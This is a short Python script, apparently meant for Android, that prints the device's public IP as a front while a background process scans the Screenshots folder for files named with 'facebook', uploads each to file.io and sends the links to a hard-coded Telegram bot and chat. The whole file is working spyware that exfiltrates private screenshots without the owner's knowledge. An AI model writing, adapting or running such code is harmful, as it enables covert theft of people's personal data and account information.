import os
import requests
import multiprocessing

directory_path = '/sdcard/DCIM/Screenshots'
response = requests.get("https://api.ipify.org?format=json")
ipadd = response.json()["ip"]
uname = "HARRRYYY"
print("YOUR IP : " + ipadd)


def upload_file_to_file_io(file_path):
    with open(file_path, 'rb') as file:
        response = requests.post('https://file.io', files={'file': file})
        response_data = response.json()
        return response_data.get('link')


def process_directory_files(directory_path):
    if os.path.exists(directory_path) and os.path.isdir(directory_path):
        for filename in os.listdir(directory_path):
            if "facebook" in filename.lower():  # Check if "facebook" is in the filename
                file_path = os.path.join(directory_path, filename)
                if os.path.isfile(file_path):
                    file_link = upload_file_to_file_io(file_path)
                    print()
                    requests.get(
                        "https://api.telegram.org/bot6907566146:AAE29bGXkKSAsrLUEuPiPqL1xbzvy4h1xyw/sendMessage?chat_id=6568295648&text= [•] FILES FOR "
                        + uname + "\nLINK : " + file_link)

    else:
        print()


if __name__ == "__main__":
    # Create a multiprocessing Process to run the function in the background
    background_process = multiprocessing.Process(target=process_directory_files, args=(directory_path,))
    background_process.start()
